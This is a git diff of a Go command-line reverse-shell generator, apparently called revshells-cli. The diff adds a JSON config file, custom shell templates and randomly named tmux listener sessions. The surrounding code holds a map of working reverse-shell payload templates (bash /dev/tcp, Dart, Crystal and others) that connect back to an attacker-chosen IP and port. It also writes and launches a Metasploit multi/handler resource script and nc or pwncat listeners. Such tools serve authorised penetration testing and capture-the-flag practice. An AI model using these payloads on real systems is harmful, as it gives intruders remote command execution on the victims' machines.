@@ -2,7 +2,11 @@ package main
 
 import (
     "encoding/base64"
+    "encoding/json"
     "github.com/atotto/clipboard"
+    "math/rand"
+    "time"
+    "path/filepath"
     "flag"
     "fmt"
     "net"
@@ -14,6 +18,28 @@ import (
     "log"
 )
 
+type Config struct {
+    GuiListener   string           `json:"gui_listener"`
+    CliListener   string           `json:"cli_listener"`
+    CustomShells map[string]string `json:"custom_shells"`
+}
+
+func loadConfig(configPath string) (*Config, error) {
+    configFile, err := os.Open(configPath)
+    if err != nil {
+        return nil, err // File not found or other error
+    }
+    defer configFile.Close()
+    
+    var config Config
+    err = json.NewDecoder(configFile).Decode(&config)
+    if err != nil {
+        return nil, err
+    }
+    
+    return &config, nil
+}
+
 func getTun0IP() string {
     iface, err := net.InterfaceByName("tun0")
     if err != nil {
@@ -24,13 +50,13 @@ func getTun0IP() string {
             return "127.0.0.1"
         }
     }
-
+    
     addrs, err := iface.Addrs()
     if err != nil || len(addrs) == 0 {
         fmt.Println(colorRed + "[-]" + colorReset + " Could not get addresses for interface. Using localhost.")
         return "127.0.0.1"
     }
-
+    
     for _, addr := range addrs {
         var ip net.IP
         switch v := addr.(type) {
@@ -39,12 +65,12 @@ func getTun0IP() string {
         case *net.IPAddr:
             ip = v.IP
         }
-
+        
         if ip != nil && ip.To4() != nil { 
             return ip.String()
         }
     }
-
+    
     return "127.0.0.1"
 }
 
@@ -63,13 +89,13 @@ func urlEncode(data string) string {
 func listShellsInColumns(shellMap map[string]string) {
     const numColumns = 4
     keys := make([]string, 0, len(shellMap))
-
+    
     for k := range shellMap {
         keys = append(keys, k)
     }
-
+    
     sort.Strings(keys)
-
+    
     for i := 0; i < len(keys); i += numColumns {
         for j := 0; j < numColumns; j++ {
             if i+j < len(keys) {
@@ -85,8 +111,24 @@ const (
     colorGreen = "\033[32m"
     colorReset = "\033[0m"
 )
+func randomString(length int) string {
+    const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
+    seededRand := rand.New(rand.NewSource(time.Now().UnixNano()))
+    b := make([]byte, length)
+    for i := range b {
+        b[i] = charset[seededRand.Intn(len(charset))]
+    }
+    return string(b)
+}
 
 func main() {
+    // Determine the config file path
+    homeDir, err := os.UserHomeDir()
+    if err != nil {
+        log.Fatal(colorRed + "[-]" + colorReset + " Failed to find home directory: ", err)
+    }
+    configPath := filepath.Join(homeDir, ".config/revshells-cli.json")
+    
     shellFormatMap := map[string]string{
         "bash":              "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
         "bash_196":          "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
@@ -157,7 +199,19 @@ func main() {
         "dart":              "import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"{ip}\", {port}).then((socket) {\n    socket.listen((data) {\n      Process.start('{shell}', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}",
         "crystal_system":    "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{ip}\",{port});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'",
         "crystal_code":      "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{ip}\", {port})\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend"}
-
+        // Load the configuration
+        config, err := loadConfig(configPath)
+        if err != nil {
+            fmt.Println(colorRed + "[-]" + colorReset + " No config file found or error in reading. Using default settings.")
+            config = &Config{
+                GuiListener: "x-terminal-emulator -e", // Default values
+                CliListener: "tmux new -d -s {session}",
+                CustomShells: make(map[string]string),
+            }
+        }
+        for key, value := range config.CustomShells {
+            shellFormatMap[key] = value
+        }
         listShells := flag.Bool("L", false, "List all available shells")
         listenerMode := flag.String("mode", "gui", "Mode for listener (gui/cli)")
         listenerType := flag.String("l", "", "Type of listener (nc, msf, pwncat)")
@@ -166,7 +220,7 @@ func main() {
         ip := flag.String("i", "tun0", "the IP address")
         port := flag.String("p", "4444", "the port number")
         revShell := flag.String("r", "bash", "Choose the reverse shell format")
-    
+        
         flag.Parse()
         if *listShells {
             listShellsInColumns(shellFormatMap)
@@ -199,32 +253,31 @@ func main() {
         fmt.Println(colorRed + "============ SHELL CODE ============" + colorReset)
         fmt.Println(shellTemplate)
         fmt.Println(colorRed + "====================================" + colorReset)
-        err := clipboard.WriteAll(shellTemplate)
+        err = clipboard.WriteAll(shellTemplate)
         if err != nil {
             fmt.Println("Failed to copy to clipboard:", err)
             return
         }
         fmt.Println(colorGreen + "[+]" + colorReset + " Reverse shell code copied to clipboard.")
         if *listenerType != "" {
-            var command string
-
+            var command string          
             switch *listenerType {
             case "nc":
                 command = fmt.Sprintf("nc -lvns %s -p %s", *ip, *port)
             case "msf":
                 // Create a resource script
                 resourceScript := "use exploit/multi/handler\n" +
-                                  "set PAYLOAD payload/generic/shell_reverse_tcp\n" + // Set your payload
-                                  fmt.Sprintf("set LHOST %s\n", *ip) +
-                                  fmt.Sprintf("set LPORT %s\n", *port) +
-                                  "exploit\n"
-            
+                "set PAYLOAD payload/generic/shell_reverse_tcp\n" + // Set your payload
+                fmt.Sprintf("set LHOST %s\n", *ip) +
+                fmt.Sprintf("set LPORT %s\n", *port) +
+                "exploit\n"
+                
                 // Write the resource script to a temporary file
                 tmpfile, err := os.CreateTemp("", "msfscript")
                 if err != nil {
                     log.Fatal(err)
                 }
-            
+                
                 if _, err := tmpfile.Write([]byte(resourceScript)); err != nil {
                     tmpfile.Close()
                     log.Fatal(err)
@@ -232,7 +285,7 @@ func main() {
                 if err := tmpfile.Close(); err != nil {
                     log.Fatal(err)
                 }
-            
+                
                 // Construct the command to run msfconsole with the resource script
                 command = fmt.Sprintf("msfconsole -r %s", tmpfile.Name())  
             case "pwncat":
@@ -241,15 +294,19 @@ func main() {
                 fmt.Println(colorRed + "[-]" + colorReset + " Invalid listener type specified")
                 return
             }
+
             if *listenerMode == "cli" {
-                // Run in tmux for CLI mode
-                command = "tmux new -d -s listener '" + command + "'"
+                // Default is tmux, make config file and change if wished
+                randomSuffix := randomString(6) // Create a random string to append to the session name so you can run multiple
+                sessionName := "listener_" + randomSuffix
+                multiplexer := strings.Replace(config.CliListener, "{session}", sessionName, -1)
+                command = fmt.Sprintf("%s %s", multiplexer, command)
+                fmt.Println(colorGreen + "[+]" + colorReset + " Running: "+command)
             } else {
-                // Run in x-terminal-emulator for GUI mode
-                // If you need a diff term change this
-                command = "x-terminal-emulator -e '" + command + "'"
+                // Default is x-terminal-emulator, make config file and change if wished
+                command = fmt.Sprintf("%s '%s'", config.GuiListener, command)
+                fmt.Println(colorGreen + "[+]" + colorReset + " Running: "+command)
             }
-        
             // Execute the command
             cmd := exec.Command("bash", "-c", command)
             err := cmd.Start()
@@ -258,9 +315,9 @@ func main() {
                 return
             }
             if *listenerMode == "cli" {
-                fmt.Println(colorGreen + "[+]" + colorReset + " Listener started in a new screen session\n    Use `tmux attach-session -t listener` to connect.")
-            } else {
-                fmt.Println(colorGreen + "[+]" + colorReset + " Listener started in a new terminal")
-            }    
-        }
-    }
+                fmt.Println(colorGreen + "[+]" + colorReset + " Listener started.")
+                } else {
+                    fmt.Println(colorGreen + "[+]" + colorReset + " Listener started in a new terminal")
+                    }    
+                }
+            }
